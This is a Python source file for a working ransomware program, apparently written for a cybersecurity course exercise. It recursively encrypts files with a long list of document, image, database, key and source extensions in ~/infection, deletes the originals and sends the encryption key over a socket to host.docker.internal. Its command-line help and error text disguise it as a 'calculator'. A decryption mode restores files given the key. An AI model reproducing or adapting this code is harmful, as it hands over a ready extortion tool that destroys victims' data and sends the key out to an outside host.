from os import listdir, remove
from os.path import expanduser, isdir, join, splitext
import sys, argparse, socket
from cryptography.fernet import Fernet

is_silent: bool = False

## https://logrhythm.com/blog/a-technical-analysis-of-wannacry-ransomware/ ##
ext_lst = [ ".docx",  ".ppam",  ".sti", ".vcd",  ".3gp", ".sch",     ".myd",
".docb",  ".potx",    ".sldx",  ".jpeg",".mp4",	 ".dch", ".frm",     ".slk",
".docm",  ".potm",    ".sldm",	".jpg",	".mov",	 ".dip", ".odb",     ".dif",
".dot",   ".pst",     ".sldm",	".bmp",	".avi",	 ".pl",	 ".dbf",     ".stc",
".dotm",  ".ost",     ".vdi",	".png",	".asf",	 ".vb",	 ".db",	     ".sxc",
".dotx",  ".msg",     ".vmdk",	".gif",	".mpeg", ".vbs", ".mdb",     ".ots",
".xls",   ".eml",     ".vmx",	".raw",	".vob",	 ".ps1", ".accdb",   ".ods",
".xlsm",  ".vsd",     ".aes",	".tif",	".wmv",	 ".cmd", ".sqlitedb",".max",
".xlsb",  ".vsdx",    ".ARC",	".tiff",".fla",	 ".js",	 ".sqlite3", ".3ds",
".xlw",   ".txt",     ".PAQ",	".nef",	".swf",	 ".asm", ".asc",     ".uot",
".xlt",   ".csv",     ".bz2",	".psd",	".wav",	 ".h",	 ".lay6",    ".stw",
".xlm",   ".rtf",     ".tbk",	".ai",	".mp3",	 ".pas", ".lay",     ".sxw",
".xlc",   ".123",     ".bak",	".svg",	".sh",	 ".cpp", ".mml",     ".ott",
".xltx",  ".wks",     ".tar",	".djvu",".class",".c",	 ".sxm",     ".odt",
".xltm",  ".wk1",     ".tgz",	".m4u",	".jar",	 ".cs",	 ".otg",     ".pem",
".ppt",   ".pdf",     ".gz",	".m3u",	".java", ".suo", ".odg",     ".p12",
".pptx",  ".dwg",     ".7z",	".mid",	".rb",	 ".sln", ".uop",     ".csr",
".pptm",  ".onetoc2", ".rar",	".wma",	".asp",	 ".ldf", ".std",     ".crt",
".pot",   ".snt",     ".zip",	".flv",	".php",	 ".mdf", ".sxd",     ".key",
".pps",   ".hwp",     ".backup",".3g2",	".jsp",	 ".ibd", ".otp",     ".pfx",
".ppsm",  ".602",     ".iso",	".mkv",	".brd",	 ".myi", ".odp",     ".der",
".ppsx",  ".sxi",     ".wb2"]

def encrypt_loop(dir_path: str, f: Fernet):
    try:
        name_list = listdir(dir_path)
    except Exception as e:
        if is_silent == False:
            print('(for logging purposes) ' + str(e), file=sys.stderr)
        return 
    for name in name_list:
        file = join(dir_path, name)
        if isdir(file):
            encrypt_loop(file, f)
        else:
            file_ext = splitext(file)[1]
            
            for ext in ext_lst:
                if ext == file_ext:
                    new_file = file + '.ft'
                    try:
                        with open(file, 'rb') as f_in:
                            raw_data = f_in.read()
                        with open(new_file, 'wb') as f_out:
                            f_out.write(f.encrypt(raw_data))
                        remove(file)
                        if is_silent == False:
                            print('[ 💥💣💀 ] ' + file)
                        break
                    except Exception as e:
                        if is_silent == False:
                            print('(for logging purposes) ' + str(e), file=sys.stderr)
                        pass

def decrypt_loop(dir_path: str, f: Fernet):
    for name in listdir(dir_path):
        file = join(dir_path, name)
        if isdir(file):
            decrypt_loop(file, f)
        else:
            file_data = splitext(file)
            if file_data[1] == '.ft':
                decrypted_file = file_data[0]
                try:
                    with open(file, 'rb') as f_in:
                        encrypted_data = f_in.read()
                    recovered_data = f.decrypt(encrypted_data)
                    with open(decrypted_file, 'wb') as f_out:
                        f_out.write(recovered_data)
                    remove(file)
                    if is_silent == False:
                        print('[ 🏞 ️🌸️😎 ] ' + decrypted_file)
                    break
                except Exception:
                    pass

def save_key(key: bytes):
    HOST = 'host.docker.internal'
    PORT = 30001
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send(key)
        s.send(b'\n')

def main() -> int:
    parser = argparse.ArgumentParser(description='Calculator: used for calculations')

    parser.add_argument('-v', '--version', help='shows version', action='version', version='stockholm:madrid_cybersecurity, v0.0.1')
    parser.add_argument('-r', '--reverse', type=str, help='reverse encryption',
                         metavar=('DECRYPT_KEY'))
    parser.add_argument('-s', '--silent', help='does not show output', action='store_true')
    args = parser.parse_args()

    global is_silent
    is_silent = args.silent

    home_path = expanduser('~')
    if not (home_path and isdir(home_path)):
        print('Fatal error: user has no directory to infect', file = sys.stderr)
        return 1
    target_path = join(home_path, 'infection')
    if not isdir(target_path):
       print('Fatal error: target directory does not exist in user home directory', file = sys.stderr)
       return 1

    if args.reverse:
        try:
            f = Fernet(args.reverse)
        except Exception:
            print('Invalid key provided')
            return 1
        decrypt_loop(target_path, f)
        return 0
    else:
        key = Fernet.generate_key()
        f = Fernet(key)
        try:
            save_key(key)
        except Exception:
            print('Could not execute calculator :-(')
            return 1
        encrypt_loop(target_path, f)
        return 0

if __name__ == "__main__":
    sys.exit(main())
